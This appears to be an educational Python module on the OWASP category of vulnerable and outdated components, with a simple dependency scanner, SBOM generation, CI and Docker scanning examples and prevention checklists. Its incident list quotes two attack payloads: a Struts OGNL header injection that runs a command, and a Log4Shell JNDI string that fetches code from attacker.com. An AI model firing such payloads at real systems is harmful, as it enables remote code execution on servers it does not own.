"""
OWASP A06:2021 - Vulnerable and Outdated Components
=====================================================

Using components with known vulnerabilities is a widespread issue. This includes
libraries, frameworks, and other software modules that run with full privileges.
If a vulnerable component is exploited, such an attack can facilitate serious
data loss or server takeover.

Common issues:
- Using outdated libraries
- Not scanning for vulnerabilities
- Not patching components
- Using unmaintained dependencies
- Not knowing component versions
"""

import sys
import pkg_resources

# ============================================================================
# EXAMPLES OF VULNERABLE COMPONENTS
# ============================================================================

"""
VULNERABLE: Outdated packages with known CVEs

# requirements.txt (VULNERABLE VERSION)
Flask==0.12.2         # CVE-2018-1000656 (Denial of Service)
requests==2.6.0       # CVE-2018-18074 (Credential Leak)
Pillow==5.2.0         # CVE-2019-16865 (Buffer Overflow)
SQLAlchemy==1.2.0     # CVE-2019-7164, CVE-2019-7548
Django==1.11.0        # Multiple CVEs
urllib3==1.24.1       # CVE-2019-11324, CVE-2020-26137
PyYAML==3.12          # CVE-2017-18342 (Code Execution)
Jinja2==2.9.6         # CVE-2019-10906 (Sandbox Escape)
cryptography==2.0     # Multiple CVEs
paramiko==2.0.0       # CVE-2018-1000805

Impacts:
- Remote Code Execution (RCE)
- Denial of Service (DoS)
- Authentication Bypass
- SQL Injection
- XML External Entity (XXE)
- Sandbox Escape
"""

# ============================================================================
# DETECTION EXAMPLES
# ============================================================================

def check_package_version(package_name):
    """
    Check if package has a known vulnerable version
    
    This is educational - use safety/snyk in production
    """
    try:
        version = pkg_resources.get_distribution(package_name).version
        return version
    except:
        return None


def scan_dependencies():
    """
    SECURE: Scan for vulnerable dependencies
    
    Tool: This simulates what tools like safety, snyk, or pip-audit do
    """
    # Known vulnerable versions (simplified example)
    vulnerabilities = {
        'Flask': {
            '0.12.2': 'CVE-2018-1000656: Denial of Service',
            '0.12.3': 'CVE-2019-1010083: Unexpected memory usage'
        },
        'requests': {
            '2.6.0': 'CVE-2018-18074: Credential exposure',
            '2.19.1': 'CVE-2018-18074: Improper certificate validation'
        },
        'Pillow': {
            '5.2.0': 'CVE-2019-16865: Buffer overflow',
            '6.2.0': 'CVE-2020-5312: Buffer overflow'
        },
        'PyYAML': {
            '3.12': 'CVE-2017-18342: Arbitrary code execution',
            '5.1': 'CVE-2020-1747: Arbitrary code execution'
        },
        'Jinja2': {
            '2.9.6': 'CVE-2019-10906: Sandbox escape',
            '2.10.0': 'CVE-2020-28493: ReDoS'
        }
    }
    
    print("\n=== Dependency Security Scan ===\n")
    
    installed_packages = list(pkg_resources.working_set)
    vulnerable_found = []
    
    for package in installed_packages:
        package_name = package.project_name
        package_version = package.version
        
        if package_name in vulnerabilities:
            if package_version in vulnerabilities[package_name]:
                vuln_info = vulnerabilities[package_name][package_version]
                vulnerable_found.append({
                    'package': package_name,
                    'version': package_version,
                    'vulnerability': vuln_info
                })
                print(f"❌ VULNERABLE: {package_name}=={package_version}")
                print(f"   {vuln_info}\n")
    
    if not vulnerable_found:
        print("✅ No known vulnerabilities found in scanned packages")
    else:
        print(f"\n⚠️  Found {len(vulnerable_found)} vulnerable packages")
        print("   Run 'pip install --upgrade <package>' to update")
    
    return vulnerable_found


# ============================================================================
# REAL-WORLD VULNERABLE COMPONENT EXAMPLES
# ============================================================================

"""
1. EQUIFAX BREACH (2017)
   Component: Apache Struts 2
   Vulnerability: CVE-2017-5638 (RCE)
   Impact: 147 million records compromised
   Root Cause: Did not patch for 2 months after fix released
   
   Attack:
   Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)
   .#foo=new java.lang.ProcessBuilder({'cmd.exe','/c','whoami'}).start()}

2. DJANGO SQL INJECTION (CVE-2022-28346)
   Component: Django
   Affected Versions: < 2.2.28, 3.2.13, 4.0.4
   Vulnerability: SQL injection in QuerySet.explain()
   Impact: Database compromise
   
   Fix: Update to patched version

3. LOG4SHELL (CVE-2021-44228)
   Component: Apache Log4j
   Vulnerability: Remote Code Execution via JNDI
   Impact: Thousands of applications compromised
   
   Attack: ${jndi:ldap://attacker.com/exploit}
   
4. SPRING4SHELL (CVE-2022-22965)
   Component: Spring Framework
   Vulnerability: RCE via class manipulation
   Impact: Full server compromise
   
5. POLYFILL.IO SUPPLY CHAIN ATTACK (2024)
   Component: polyfill.io CDN
   Vulnerability: Malicious code injection
   Impact: 100,000+ websites affected

6. HEARTBLEED (CVE-2014-0160)
   Component: OpenSSL
   Vulnerability: Buffer over-read
   Impact: Memory disclosure, private key theft
"""

# ============================================================================
# SECURE DEPENDENCY MANAGEMENT
# ============================================================================

"""
SECURE: requirements.txt with version pinning

# requirements.txt (SECURE VERSION - Always check for latest)
Flask==3.0.0
requests==2.31.0
Pillow==10.1.0
SQLAlchemy==2.0.23
urllib3==2.1.0
PyYAML==6.0.1
Jinja2==3.1.2
cryptography==41.0.7
paramiko==3.4.0

# Pinning specific versions ensures consistency
# Use dependabot or renovate for automated updates
"""

# ============================================================================
# AUTOMATED VULNERABILITY SCANNING
# ============================================================================

"""
SECURE: Use automated scanning tools

1. SAFETY (Python)
   $ pip install safety
   $ safety check
   $ safety check --json > vulnerabilities.json

2. SNYK
   $ snyk test
   $ snyk monitor

3. PIP-AUDIT
   $ pip install pip-audit
   $ pip-audit

4. OWASP DEPENDENCY-CHECK
   $ dependency-check --project myapp --scan .

5. TRIVY (Container Scanning)
   $ trivy image myapp:latest

6. GITHUB DEPENDABOT
   # .github/dependabot.yml
   version: 2
   updates:
     - package-ecosystem: "pip"
       directory: "/"
       schedule:
         interval: "daily"

7. SEMGREP
   $ semgrep --config=auto
"""

# Example: Integrating safety check in CI/CD
def ci_vulnerability_check():
    """
    SECURE: Automated vulnerability check in CI/CD pipeline
    
    This should run on every build
    """
    import subprocess
    
    print("Running security vulnerability scan...")
    
    try:
        # Run safety check
        result = subprocess.run(
            ['safety', 'check', '--json'],
            capture_output=True,
            text=True
        )
        
        if result.returncode != 0:
            print("❌ Vulnerabilities found!")
            print(result.stdout)
            return False
        else:
            print("✅ No vulnerabilities found")
            return True
            
    except FileNotFoundError:
        print("⚠️  Safety not installed. Run: pip install safety")
        return False


# ============================================================================
# DEPENDENCY INVENTORY
# ============================================================================

def generate_sbom():
    """
    SECURE: Software Bill of Materials (SBOM)
    
    Maintain an inventory of all components
    """
    print("\n=== Software Bill of Materials (SBOM) ===\n")
    
    packages = list(pkg_resources.working_set)
    packages.sort(key=lambda x: x.project_name.lower())
    
    print(f"Total packages: {len(packages)}\n")
    print(f"{'Package':<30} {'Version':<15} {'License':<20}")
    print("=" * 65)
    
    for package in packages[:10]:  # Show first 10 for demo
        name = package.project_name
        version = package.version
        
        # Try to get license info
        try:
            metadata = package.get_metadata('METADATA')
            license_info = 'Unknown'
            for line in metadata.split('\n'):
                if line.startswith('License:'):
                    license_info = line.split(':', 1)[1].strip()
                    break
        except:
            license_info = 'Unknown'
        
        print(f"{name:<30} {version:<15} {license_info:<20}")
    
    print("\n... (showing first 10 of {})".format(len(packages)))


# ============================================================================
# PREVENTION BEST PRACTICES
# ============================================================================

"""
VULNERABLE COMPONENT PREVENTION:

Inventory:
✅ Maintain Software Bill of Materials (SBOM)
✅ Track all dependencies (direct and transitive)
✅ Document component versions
✅ Know which components are used where

Monitoring:
✅ Subscribe to security advisories (CVE, GitHub Security)
✅ Use automated scanning (Dependabot, Snyk, Safety)
✅ Monitor dependency health
✅ Track end-of-life components

Updating:
✅ Regular dependency updates
✅ Test updates in staging first
✅ Automated pull requests for security updates
✅ Emergency patching process

Scanning:
✅ Scan dependencies on every build
✅ Fail builds on high-severity vulnerabilities
✅ Container image scanning
✅ License compliance checking

Policies:
✅ Only use maintained libraries
✅ Minimum version requirements
✅ Approved component list
✅ Security review for new dependencies

Tools:
✅ GitHub Dependabot
✅ Snyk
✅ Safety (Python)
✅ npm audit (Node.js)
✅ OWASP Dependency-Check
✅ Trivy (Containers)
✅ Renovate

DEVELOPMENT WORKFLOW:

1. Before adding dependency:
   - Check if it's maintained
   - Review security history
   - Check license compatibility
   - Look for alternatives

2. During development:
   - Pin versions in requirements.txt
   - Use virtual environments
   - Regular 'safety check' runs

3. In CI/CD:
   - Automated vulnerability scanning
   - Fail build on high severity
   - Generate SBOM
   - Update staging environment

4. In production:
   - Monitor for new CVEs
   - Automated security updates
   - Regular manual reviews
   - Emergency patch procedure

CODE CHECKLIST:

✅ All dependencies listed in requirements.txt
✅ Versions pinned (not using *)
✅ No known vulnerabilities (safety check passes)
✅ All packages up-to-date (or justified)
✅ Automated scanning configured
✅ SBOM generated
✅ License compliance verified
✅ No unused dependencies
"""

# ============================================================================
# GITHUB ACTIONS EXAMPLE
# ============================================================================

"""
SECURE: GitHub Actions workflow for dependency scanning

# .github/workflows/security-scan.yml
name: Security Scan

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 0 * * *'  # Daily

jobs:
  security-scan:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements.txt
        pip install safety
    
    - name: Run Safety Check
      run: |
        safety check --json
        safety check --bare
    
    - name: Run Snyk
      uses: snyk/actions/python@master
      env:
        SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      with:
        command: test
        args: --severity-threshold=high
    
    - name: Upload results
      uses: github/codeql-action/upload-sarif@v2
      with:
        sarif_file: snyk.sarif
"""

# ============================================================================
# DOCKER BEST PRACTICES
# ============================================================================

"""
SECURE: Dockerfile with security scanning

# Dockerfile
FROM python:3.11-slim as builder

# Install dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir --user -r requirements.txt

# Scan for vulnerabilities
RUN pip install safety && \
    safety check --json || exit 1

FROM python:3.11-slim

# Copy dependencies from builder
COPY --from=builder /root/.local /root/.local

# Add to PATH
ENV PATH=/root/.local/bin:$PATH

COPY . /app
WORKDIR /app

USER nobody

CMD ["python", "app.py"]

---

# Scan Docker image with Trivy
$ trivy image --severity HIGH,CRITICAL myapp:latest

# Scan in CI/CD
$ docker build -t myapp:latest .
$ trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:latest
"""

# ============================================================================
# REAL-WORLD PREVENTION EXAMPLES
# ============================================================================

"""
SUCCESS STORIES: Companies doing it right

1. Netflix
   - Automated dependency updates
   - Custom tooling (Repokid, Security Monkey)
   - Regular security reviews
   - Fast patch deployment

2. Google
   - Centralized dependency management
   - Automated vulnerability scanning
   - 24-hour patch SLA for critical vulnerabilities
   - Internal mirror of dependencies

3. Microsoft
   - Component Governance in Azure DevOps
   - Automated scanning in CI/CD
   - Security Development Lifecycle (SDL)
   - Patch Tuesday process

KEY METRICS TO TRACK:

- Time to patch (MTTP)
- Number of vulnerable dependencies
- Age of dependencies
- Number of outdated packages
- Coverage of scanning (% of code)
- False positive rate
"""

# ============================================================================
# TESTING
# ============================================================================

def main():
    """Run all security checks"""
    print("=" * 70)
    print("OWASP A06:2021 - Vulnerable and Outdated Components")
    print("=" * 70)
    
    # Check for vulnerabilities
    scan_dependencies()
    
    # Generate SBOM
    generate_sbom()
    
    print("\n" + "=" * 70)
    print("RECOMMENDATIONS:")
    print("=" * 70)
    print("\n1. Run 'safety check' regularly")
    print("2. Enable GitHub Dependabot")
    print("3. Set up automated scanning in CI/CD")
    print("4. Review and update dependencies monthly")
    print("5. Subscribe to security advisories")
    print("6. Use version pinning in requirements.txt")
    print("7. Scan container images with Trivy")
    print("8. Maintain SBOM")
    print("\nFor more information:")
    print("- https://github.com/pyupio/safety")
    print("- https://snyk.io")
    print("- https://owasp.org/www-project-dependency-check/")


if __name__ == '__main__':
    main()


